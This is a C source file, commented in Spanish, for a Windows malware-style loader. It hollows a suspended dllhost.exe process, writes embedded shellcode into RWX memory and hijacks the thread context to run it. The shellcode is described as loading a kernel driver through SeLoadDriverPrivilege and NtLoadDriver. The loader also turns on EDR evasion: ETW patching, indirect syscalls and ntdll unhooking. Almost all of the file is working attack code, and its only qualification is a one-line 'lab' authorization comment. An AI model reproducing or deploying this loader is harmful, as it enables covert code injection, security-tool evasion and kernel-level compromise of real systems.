/*
 * dropper_loader.c -- inyecta shellcode position-independent en dllhost
 *   hollowed; el shellcode hace:
 *     - SeLoadDriverPrivilege
 *     - HKLM\...\Services\MyDrv registry
 *     - syscall NtLoadDriver
 *     - C:\Tools\load_status.txt marker
 *     - NtTerminateProcess(0)
 *
 *  Autorizado para lab.
 */
#include <windows.h>
#include <stdio.h>
#include "bypass.h"
#include "syscalls.h"
#include "helpers.h"
#include "shellcode_embedded.h"

int main(int argc, char **argv) {
    bp_result_t br = bp_init(BP_ETW_PATCH | BP_INDIRECT_SYSCALLS | BP_NTDLL_UNHOOK_SELECTIVE);
    fprintf(stdout, "[loader] bp_init=%d\n", br);

    /* limpiar marker previo */
    CreateDirectoryA("C:\\Tools", NULL);
    DeleteFileA("C:\\Tools\\load_status.txt");

    /* spawn dllhost SUSPENDED */
    STARTUPINFOA si = { .cb = sizeof si };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[] = "C:\\Windows\\System32\\dllhost.exe";
    if (!CreateProcessA(cmd, cmd, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[loader] CreateProcess err=%lu\n", GetLastError());
        return 1;
    }
    fprintf(stdout, "[loader] dllhost PID=%lu SUSPENDED\n", pi.dwProcessId);

    /* alloc RWX */
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, SC_LEN,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!remote) {
        fprintf(stderr, "[loader] VirtualAllocEx err=%lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 2;
    }
    fprintf(stdout, "[loader] remote alloc @ %p (RWX, %u bytes)\n", remote, SC_LEN);

    /* write shellcode */
    SIZE_T wr = 0;
    if (!WriteProcessMemory(pi.hProcess, remote, SC_BYTES, SC_LEN, &wr) ||
        wr != SC_LEN) {
        fprintf(stderr, "[loader] WriteProcessMemory err=%lu wr=%zu\n",
                GetLastError(), wr);
        TerminateProcess(pi.hProcess, 1);
        return 3;
    }
    fprintf(stdout, "[loader] shellcode written, entry @ %p\n",
            (void *)((ULONG_PTR)remote + SC_ENTRY_OFFSET));

    /* set Rip = entry */
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)(ULONG_PTR)remote + SC_ENTRY_OFFSET;
    ctx.Rcx = ctx.Rip;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        fprintf(stderr, "[loader] SetThreadContext err=%lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 4;
    }

    /* resume */
    ResumeThread(pi.hThread);
    fprintf(stdout, "[loader] resumed; waiting up to 10s...\n");
    DWORD wait_rc = WaitForSingleObject(pi.hProcess, 10000);
    DWORD ec = 0;
    GetExitCodeProcess(pi.hProcess, &ec);

    fprintf(stdout, "\n=== dllhost PID=%lu exit code = 0x%08lx (%lu)  wait=%lu ===\n\n",
            pi.dwProcessId, ec, ec, wait_rc);

    if (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
        TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* read marker if produced */
    HANDLE h = CreateFileA("C:\\Tools\\load_status.txt", GENERIC_READ,
                           FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        char buf[2048]; DWORD rd = 0;
        ReadFile(h, buf, sizeof buf - 1, &rd, NULL); buf[rd] = 0;
        CloseHandle(h);
        fputs("---- load_status.txt ----\n", stdout);
        fputs(buf, stdout);
        fputs("\n---- end ----\n", stdout);
    } else {
        fputs("[loader] no marker file produced.\n", stdout);
    }
    return (ec == 0 || ec == 0x103) ? 0 : 100;
}
